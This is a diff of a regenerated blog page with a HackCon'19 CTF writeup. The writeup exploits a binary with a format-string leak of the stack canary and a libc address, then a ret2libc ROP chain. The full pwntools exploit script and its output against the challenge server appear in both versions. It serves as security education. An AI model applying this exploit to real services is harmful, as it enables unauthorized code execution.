@@ -1,7 +1,8 @@
 <!DOCTYPE html>
 <html lang="en-us">
     <head>
-         
+        
+
         <meta charset="utf-8">
         <meta name="viewport" content="width=device-width, initial-scale=1">
         <title>HackCon&#39;19 writeup - Not So Easy B0f</title>
@@ -39,13 +40,21 @@
 <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" integrity="sha384-wvfXpqpZZVQGK6TAh5PVlGOfQNHSoD2xbE+QkPxCAFlNEevoEH3Sl0sibVcOQVnN" crossorigin="anonymous">
  
 
-
     <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/highlight.min.js"></script>
-
-     <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/languages/go.min.js"></script>  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/languages/c.min.js"></script>  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/languages/bash.min.js"></script>  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/languages/python.min.js"></script>  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/languages/shell.min.js"></script> 
-
+    
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/languages/shell.min.js"></script>
+    
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/languages/bash.min.js"></script>
+    
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/languages/c.min.js"></script>
+    
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/languages/python.min.js"></script>
+    
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/languages/java.min.js"></script>
+    
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/languages/javascript.min.js"></script>
+    
     <script>hljs.initHighlightingOnLoad();</script>
-
 
 
 
@@ -59,39 +68,33 @@
 
 
 <script>$(document).on('click', function() { $('.collapse').collapse('hide'); })</script>
- <meta name="generator" content="Hugo 0.55.6" />
+ <meta name="generator" content="Hugo 0.72.0" />
         
 
         
 
         
+            <script type="text/javascript" async src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
         
-        <script type="text/javascript" async
-          src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
-        </script>
+
         
+
     </head>
 
     <body>
-         
+        
+
         <nav class="navbar navbar-default navbar-fixed-top">
-
             <div class="container">
-
                 <div class="navbar-header">
-
                     <a class="navbar-brand visible-xs" href="#">HackCon&#39;19 writeup - Not So Easy B0f</a>
-
                     <button class="navbar-toggle" data-target=".navbar-collapse" data-toggle="collapse">
                         <span class="icon-bar"></span>
                         <span class="icon-bar"></span>
                         <span class="icon-bar"></span>
                     </button>
-
                 </div>
-
                 <div class="collapse navbar-collapse">
-
                     
                         <ul class="nav navbar-nav">
                             
@@ -107,7 +110,6 @@
                             
                         </ul>
                     
-
                     
                         <ul class="nav navbar-nav navbar-right">
                             
@@ -117,77 +119,51 @@
                             
                                 <li class="navbar-icon"><a href="https://instagram.com/r7florio/"><i class="fa fa-instagram"></i></a></li>
                             
-                                <li class="navbar-icon"><a href="mailto:raffaeleflorio@protonmail.com"><i class="fa fa-envelope-o"></i></a></li>
+                                <li class="navbar-icon"><a href="/key.asc"><i class="fa fa-key"></i></a></li>
                             
-                                <li class="navbar-icon"><a href="/key"><i class="fa fa-key"></i></a></li>
+                                <li class="navbar-icon"><a href="mailto:raffaeleflorio@protonmail.com"><i class="fa fa-envelope-o"></i></a></li>
                             
                         </ul>
                     
-
                 </div>
-
             </div>
-
         </nav>
 
 
 <main>
 
-    <div class="item">
+    <div>
+        <h2>HackCon&#39;19 writeup - Not So Easy B0f</h2>
+        <h5>September 4, 2019</h5>
+        
+<a href="https://raffaeleflorio.github.io/tags/ctf"><kbd class="item-tag">ctf</kbd></a>
 
-    
-    
-    
+<a href="https://raffaeleflorio.github.io/tags/writeup"><kbd class="item-tag">writeup</kbd></a>
 
-    
-    
+<a href="https://raffaeleflorio.github.io/tags/pwn"><kbd class="item-tag">pwn</kbd></a>
 
-    <h4><a href="/post/notsoeasyb0f-hackcon19/">HackCon&#39;19 writeup - Not So Easy B0f</a></h4>
-    <h5>September 4, 2019</h5>
-    
-    <a href="https://raffaeleflorio.github.io/tags/ctf"><kbd class="item-tag">ctf</kbd></a>
-    
-    <a href="https://raffaeleflorio.github.io/tags/writeup"><kbd class="item-tag">writeup</kbd></a>
-    
-    <a href="https://raffaeleflorio.github.io/tags/pwn"><kbd class="item-tag">pwn</kbd></a>
-    
-    <a href="https://raffaeleflorio.github.io/tags/hackcon2019"><kbd class="item-tag">hackcon2019</kbd></a>
-    
-    <a href="https://raffaeleflorio.github.io/tags/x86"><kbd class="item-tag">x86</kbd></a>
-    
+<a href="https://raffaeleflorio.github.io/tags/hackcon2019"><kbd class="item-tag">hackcon2019</kbd></a>
 
-</div>
+<a href="https://raffaeleflorio.github.io/tags/x86"><kbd class="item-tag">x86</kbd></a>
 
 
-    <br> <div class="text-justify">
+    </div>
 
-<h1 id="intro">Intro</h1>
-
-<p>This is the third pwn challenge. It was solved 29 times and it&rsquo;s worth 469 points.</p>
-
+    <div align="left" class="content"><h1 id="intro">Intro</h1>
+<p>This is the third pwn challenge. It was solved 29 times and it’s worth 469 points.</p>
 <p>Description:</p>
-
 <blockquote>
 <p>I have stack canaries enabled, Can you still B0f me ?</p>
 </blockquote>
-
 <p>In addition to the binary there is also a specific libc.</p>
-
-<p>You can download the binary <a href="/ctf/binary/hackcon19/notsoeasyb0f">here</a> and the libc <a href="/ctf/binary/hackcon19/notsoeasyb0f-libc.so">here</a></p>
-
-<pre><code class="language-shell">$ sha256sum notsoeasyb0f notsoeasyb0f-libc.so
+<p>You can download the binary <a href="/ctf/hackcon2019/binary/notsoeasyb0f/notsoeasyb0f">here</a> and the libc <a href="/ctf/hackcon2019/binary/notsoeasyb0f/notsoeasyb0f-libc.so">here</a></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ sha256sum notsoeasyb0f notsoeasyb0f-libc.so
 9cdc861043359904c6807d31990f7369c1fec2d25e545e263bb4ae2e5786883e  notsoeasyb0f
 74ca69ada4429ae5fce87f7e3addb56f1b53964599e8526244fecd164b3c4b44  notsoeasyb0f-libc.so
-</code></pre>
-
-<h1 id="exploitation">Exploitation</h1>
-
-<p>This program asks for a name, echoes it back, then it asks a sentence.
-It seems that both input are vulnerable to a buffer overflow.</p>
-
+</code></pre></div><h1 id="exploitation">Exploitation</h1>
+<p>This program asks for a name, echoes it back, then it asks a sentence. It seems that both input are vulnerable to a buffer overflow.</p>
 <p>However, as the description says, <code>stack canary</code> is enabled.</p>
-
-<pre><code class="language-shell">$ ./notsoeasyb0f
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ ./notsoeasyb0f
 Enter name : NAME
 Hello
 NAME
@@ -197,7 +173,7 @@ $ ./notsoeasyb0f
 Enter name : AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 Hello
 *** stack smashing detected ***: &lt;unknown&gt; terminated
-Aborted (core dumped)
+Aborted <span style="color:#f92672">(</span>core dumped<span style="color:#f92672">)</span>
 
 $ ./notsoeasyb0f
 Enter name : NAME
@@ -205,7 +181,7 @@ Hello
 ASD
 Enter sentence : AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 *** stack smashing detected ***: &lt;unknown&gt; terminated
-Aborted (core dumped)
+Aborted <span style="color:#f92672">(</span>core dumped<span style="color:#f92672">)</span>
 
 $ checksec ./notsoeasyb0f
     Arch:     amd64-64-little
@@ -213,105 +189,87 @@ $ checksec ./notsoeasyb0f
     Stack:    Canary found
     NX:       NX enabled
     PIE:      PIE enabled
-</code></pre>
-
-<p>Given the protections and the libc, a two stage attack will be performed. First a leak then a <code>ROP</code>.</p>
-
-<p>I opened with r2, as usual, and the only interesting function is the vulnerable one: <code>main</code>.
-And it&rsquo;s really simple:</p>
-
-<p><img src="/images/hackcon19/notsoeasyb0f-main.jpg" alt="main function" /></p>
-
-<p>It&rsquo;s vulnerable to <code>buffer overflow</code> and <code>format string</code>. The former is at the second <code>fgets</code>, the latter is at the second <code>printf</code>.</p>
-
-<p>So we could use the <code>format string</code> to leak the canary and a libc address. Then the <code>bof</code> to build a simple <code>ROP chain</code>.
-With trial and error and the help of radare it&rsquo;s easy to locate the offset to use with the <code>format string</code>:</p>
-
+</code></pre></div><p>Given the protections and the libc, a two stage attack will be performed. First a leak then a <code>ROP</code>.</p>
+<p>I opened with r2, as usual, and the only interesting function is the vulnerable one: <code>main</code>. And it’s really simple:</p>
+<p><img src="/ctf/hackcon2019/images/notsoeasyb0f-main.jpg" alt="main function"></p>
+<p>It’s vulnerable to <code>buffer overflow</code> and <code>format string</code> vulnerabilities. The former is at the second <code>fgets</code>, the latter is at the second <code>printf</code>.</p>
+<p>So we could use the <code>format string</code> to leak the canary and a libc address.
+Then the <code>bof</code> to build a simple <code>ROP chain</code>. With trial and error and the help of radare it’s easy to locate the offset to use with the <code>format string</code>:</p>
 <ul>
 <li>11 to leak the canary</li>
-<li>13 to leak the <code>saved EIP</code> of the main. In fact the latter is in the <code>__libc_start_main</code>, so in the <code>libc</code></li>
+<li>13 to leak the <code>saved EIP</code> of the <code>main</code>. In fact the latter is in the <code>__libc_start_main</code>, so in the <code>libc</code></li>
 </ul>
+<p>This is my exploit:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
 
-<p>This is the exploit:</p>
+prog <span style="color:#f92672">=</span> context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;PATH_TO_THE_BINARY&#34;</span>, checksec<span style="color:#f92672">=</span>False)
 
-<pre><code class="language-python">from pwn import *
-
-prog = context.binary = ELF(&quot;PATH_TO_THE_BINARY&quot;, checksec=False)
-
-if len(sys.argv) &gt; 1:
-        host = &quot;68.183.158.95&quot;
-        port = 8991
-        t = remote(host, port)
-        system_offset = 150368
-        binsh_offset  = 1492263
-        ret_offset    = 263
-        prdi_offset   = 1393839
-else:
-        t = prog.process()
-	# these offsets should be customized locally
-        system_offset = 0
-        binsh_offset  = 0
-        ret_offset    = 0
-        prdi_offset   = 0
+<span style="color:#66d9ef">if</span> len(sys<span style="color:#f92672">.</span>argv) <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">1</span>:
+        host <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;68.183.158.95&#34;</span>
+        port <span style="color:#f92672">=</span> <span style="color:#ae81ff">8991</span>
+        t <span style="color:#f92672">=</span> remote(host, port)
+        system_offset <span style="color:#f92672">=</span> <span style="color:#ae81ff">150368</span>
+        binsh_offset  <span style="color:#f92672">=</span> <span style="color:#ae81ff">1492263</span>
+        ret_offset    <span style="color:#f92672">=</span> <span style="color:#ae81ff">263</span>
+        prdi_offset   <span style="color:#f92672">=</span> <span style="color:#ae81ff">1393839</span>
+<span style="color:#66d9ef">else</span>:
+        t <span style="color:#f92672">=</span> prog<span style="color:#f92672">.</span>process()
+        <span style="color:#75715e"># these offsets should be customized locally</span>
+        system_offset <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+        binsh_offset  <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+        ret_offset    <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+        prdi_offset   <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
 
 
-# leak canary
-t.sendline(&quot;%11$p%13$p&quot;)
-t.recvuntil(&quot;Hello\n&quot;)
-canary = int(t.recv(numb=18).replace(&quot;\n&quot;, &quot;&quot;), 16)
-libc_leak = int(t.recvline().replace(&quot;\n&quot;, &quot;&quot;), 16)
-system_libc = libc_leak + system_offset
-binsh_libc = libc_leak + binsh_offset
-ret_libc = libc_leak + ret_offset
-prdi_libc = libc_leak + prdi_offset
-log.success(&quot;CANARY: {:#x}&quot;.format(canary))
-log.success(&quot;LIBC  : {:#x}&quot;.format(libc_leak))
-log.success(&quot;SYSTEM: {:#x}&quot;.format(system_libc))
-log.success(&quot;BINSH : {:#x}&quot;.format(binsh_libc))
-log.success(&quot;PRDI  : {:#x}&quot;.format(prdi_libc))
-log.success(&quot;RET   : {:#x}&quot;.format(ret_libc))
+<span style="color:#75715e"># leak canary</span>
+t<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">&#34;%11$p%13$p&#34;</span>)
+t<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;Hello</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
+canary <span style="color:#f92672">=</span> int(t<span style="color:#f92672">.</span>recv(numb<span style="color:#f92672">=</span><span style="color:#ae81ff">18</span>)<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#e6db74">&#34;&#34;</span>), <span style="color:#ae81ff">16</span>)
+libc_leak <span style="color:#f92672">=</span> int(t<span style="color:#f92672">.</span>recvline()<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#e6db74">&#34;&#34;</span>), <span style="color:#ae81ff">16</span>)
+system_libc <span style="color:#f92672">=</span> libc_leak <span style="color:#f92672">+</span> system_offset
+binsh_libc <span style="color:#f92672">=</span> libc_leak <span style="color:#f92672">+</span> binsh_offset
+ret_libc <span style="color:#f92672">=</span> libc_leak <span style="color:#f92672">+</span> ret_offset
+prdi_libc <span style="color:#f92672">=</span> libc_leak <span style="color:#f92672">+</span> prdi_offset
+log<span style="color:#f92672">.</span>success(<span style="color:#e6db74">&#34;CANARY: {:#x}&#34;</span><span style="color:#f92672">.</span>format(canary))
+log<span style="color:#f92672">.</span>success(<span style="color:#e6db74">&#34;LIBC  : {:#x}&#34;</span><span style="color:#f92672">.</span>format(libc_leak))
+log<span style="color:#f92672">.</span>success(<span style="color:#e6db74">&#34;SYSTEM: {:#x}&#34;</span><span style="color:#f92672">.</span>format(system_libc))
+log<span style="color:#f92672">.</span>success(<span style="color:#e6db74">&#34;BINSH : {:#x}&#34;</span><span style="color:#f92672">.</span>format(binsh_libc))
+log<span style="color:#f92672">.</span>success(<span style="color:#e6db74">&#34;PRDI  : {:#x}&#34;</span><span style="color:#f92672">.</span>format(prdi_libc))
+log<span style="color:#f92672">.</span>success(<span style="color:#e6db74">&#34;RET   : {:#x}&#34;</span><span style="color:#f92672">.</span>format(ret_libc))
 
-canary_offset = 24
-payload = &quot;P&quot;*canary_offset
-payload += p64(canary)
-payload += &quot;P&quot;*8
-payload += p64(ret_libc)  # ret
-payload += p64(prdi_libc) # pop rdi
-payload += p64(binsh_libc)
-payload += p64(system_libc)
+canary_offset <span style="color:#f92672">=</span> <span style="color:#ae81ff">24</span>
+payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;P&#34;</span><span style="color:#f92672">*</span>canary_offset
+payload <span style="color:#f92672">+=</span> p64(canary)
+payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;P&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">8</span>
+payload <span style="color:#f92672">+=</span> p64(ret_libc)  <span style="color:#75715e"># ret</span>
+payload <span style="color:#f92672">+=</span> p64(prdi_libc) <span style="color:#75715e"># pop rdi</span>
+payload <span style="color:#f92672">+=</span> p64(binsh_libc)
+payload <span style="color:#f92672">+=</span> p64(system_libc)
 
-t.sendline(payload)
-t.recvrepeat(0.3)
-t.sendline(&quot;cat flag.txt&quot;)
-print t.recvline()
-t.close()
-</code></pre>
+t<span style="color:#f92672">.</span>sendline(payload)
+t<span style="color:#f92672">.</span>recvrepeat(<span style="color:#ae81ff">0.3</span>)
+t<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">&#34;cat flag.txt&#34;</span>)
+<span style="color:#66d9ef">print</span> t<span style="color:#f92672">.</span>recvline()
+t<span style="color:#f92672">.</span>close()
+</code></pre></div><p>And this is the flag:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ ./exploit.py <span style="color:#ae81ff">1</span>
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Opening connection to 68.183.158.95 on port 8991: Done
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> CANARY: 0x38d86c5026063f00
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> LIBC  : 0x7fa7fd1fc830
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> SYSTEM: 0x7fa7fd221390
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> BINSH : 0x7fa7fd368d57
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> PRDI  : 0x7fa7fd350cdf
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> RET   : 0x7fa7fd1fc937
+d4rk<span style="color:#f92672">{</span>H3ll0_R0p<span style="color:#f92672">}</span>c0de
 
-<p>And this is the flag:</p>
-
-<pre><code class="language-shell">$ ./exploit.py 1
-[+] Opening connection to 68.183.158.95 on port 8991: Done
-[+] CANARY: 0x38d86c5026063f00
-[+] LIBC  : 0x7fa7fd1fc830
-[+] SYSTEM: 0x7fa7fd221390
-[+] BINSH : 0x7fa7fd368d57
-[+] PRDI  : 0x7fa7fd350cdf
-[+] RET   : 0x7fa7fd1fc937
-d4rk{H3ll0_R0p}c0de
-
-[*] Closed connection to 68.183.158.95 port 8991
-</code></pre>
-
-<p><img src="/images/hackcon19/notsoeasyb0f-solved.jpg" alt="notsoeasyb0f solved banner" /></p>
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Closed connection to 68.183.158.95 port <span style="color:#ae81ff">8991</span>
+</code></pre></div><p><img src="/ctf/hackcon2019/images/notsoeasyb0f-solved.jpg" alt="notsoeasyb0f solved banner"></p>
 </div>
 
     
     
-
     
-
         <h4 class="page-header">Related</h4>
-
          <div class="item">
 
     
@@ -324,16 +282,17 @@ d4rk{H3ll0_R0p}c0de
     <h4><a href="/post/pick-up-that-can-auctf2020/">AUCTF 2020 Writeup - Pick Up That CAN</a></h4>
     <h5>May 1, 2020</h5>
     
-    <a href="https://raffaeleflorio.github.io/tags/ctf"><kbd class="item-tag">ctf</kbd></a>
-    
-    <a href="https://raffaeleflorio.github.io/tags/writeup"><kbd class="item-tag">writeup</kbd></a>
-    
-    <a href="https://raffaeleflorio.github.io/tags/car-hacking"><kbd class="item-tag">car-hacking</kbd></a>
-    
-    <a href="https://raffaeleflorio.github.io/tags/can-bus"><kbd class="item-tag">can-bus</kbd></a>
-    
-    <a href="https://raffaeleflorio.github.io/tags/auctf2020"><kbd class="item-tag">auctf2020</kbd></a>
-    
+<a href="https://raffaeleflorio.github.io/tags/ctf"><kbd class="item-tag">ctf</kbd></a>
+
+<a href="https://raffaeleflorio.github.io/tags/writeup"><kbd class="item-tag">writeup</kbd></a>
+
+<a href="https://raffaeleflorio.github.io/tags/car-hacking"><kbd class="item-tag">car-hacking</kbd></a>
+
+<a href="https://raffaeleflorio.github.io/tags/can-bus"><kbd class="item-tag">can-bus</kbd></a>
+
+<a href="https://raffaeleflorio.github.io/tags/auctf2020"><kbd class="item-tag">auctf2020</kbd></a>
+
+
 
 </div>
   <div class="item">
@@ -348,16 +307,17 @@ d4rk{H3ll0_R0p}c0de
     <h4><a href="/post/remote-school-auctf2020/">AUCTF 2020 Writeup - Remote School</a></h4>
     <h5>April 20, 2020</h5>
     
-    <a href="https://raffaeleflorio.github.io/tags/ctf"><kbd class="item-tag">ctf</kbd></a>
-    
-    <a href="https://raffaeleflorio.github.io/tags/writeup"><kbd class="item-tag">writeup</kbd></a>
-    
-    <a href="https://raffaeleflorio.github.io/tags/pwn"><kbd class="item-tag">pwn</kbd></a>
-    
-    <a href="https://raffaeleflorio.github.io/tags/x86"><kbd class="item-tag">x86</kbd></a>
-    
-    <a href="https://raffaeleflorio.github.io/tags/auctf2020"><kbd class="item-tag">auctf2020</kbd></a>
-    
+<a href="https://raffaeleflorio.github.io/tags/ctf"><kbd class="item-tag">ctf</kbd></a>
+
+<a href="https://raffaeleflorio.github.io/tags/writeup"><kbd class="item-tag">writeup</kbd></a>
+
+<a href="https://raffaeleflorio.github.io/tags/pwn"><kbd class="item-tag">pwn</kbd></a>
+
+<a href="https://raffaeleflorio.github.io/tags/x86"><kbd class="item-tag">x86</kbd></a>
+
+<a href="https://raffaeleflorio.github.io/tags/auctf2020"><kbd class="item-tag">auctf2020</kbd></a>
+
+
 
 </div>
   <div class="item">
@@ -372,32 +332,36 @@ d4rk{H3ll0_R0p}c0de
     <h4><a href="/post/password-cracking-challenges-auctf2020/">AUCTF 2020 Writeup - Password Cracking Challenges</a></h4>
     <h5>April 20, 2020</h5>
     
-    <a href="https://raffaeleflorio.github.io/tags/ctf"><kbd class="item-tag">ctf</kbd></a>
-    
-    <a href="https://raffaeleflorio.github.io/tags/writeup"><kbd class="item-tag">writeup</kbd></a>
-    
-    <a href="https://raffaeleflorio.github.io/tags/password"><kbd class="item-tag">password</kbd></a>
-    
-    <a href="https://raffaeleflorio.github.io/tags/cracking"><kbd class="item-tag">cracking</kbd></a>
-    
-    <a href="https://raffaeleflorio.github.io/tags/auctf2020"><kbd class="item-tag">auctf2020</kbd></a>
-    
+<a href="https://raffaeleflorio.github.io/tags/ctf"><kbd class="item-tag">ctf</kbd></a>
+
+<a href="https://raffaeleflorio.github.io/tags/writeup"><kbd class="item-tag">writeup</kbd></a>
+
+<a href="https://raffaeleflorio.github.io/tags/password"><kbd class="item-tag">password</kbd></a>
+
+<a href="https://raffaeleflorio.github.io/tags/cracking"><kbd class="item-tag">cracking</kbd></a>
+
+<a href="https://raffaeleflorio.github.io/tags/hashcat"><kbd class="item-tag">hashcat</kbd></a>
+
+<a href="https://raffaeleflorio.github.io/tags/auctf2020"><kbd class="item-tag">auctf2020</kbd></a>
+
+
 
 </div>
  
-
     
 
+    
     
 
 </main>
 
         <footer>
-
-            <p class="copyright text-muted">&copy; All rights reserved. Powered by <a href="https://gohugo.io">Hugo</a> and <a href="https://github.com/calintat/minimal">Minimal</a></p>
-
+            <p class="copyright text-muted">© All rights reserved. Powered by <a href="https://gohugo.io">Hugo</a> and <a href="https://github.com/calintat/minimal">Minimal</a>.</p>
         </footer>
-       
+
+        
+
+        
     </body>
 
 </html>
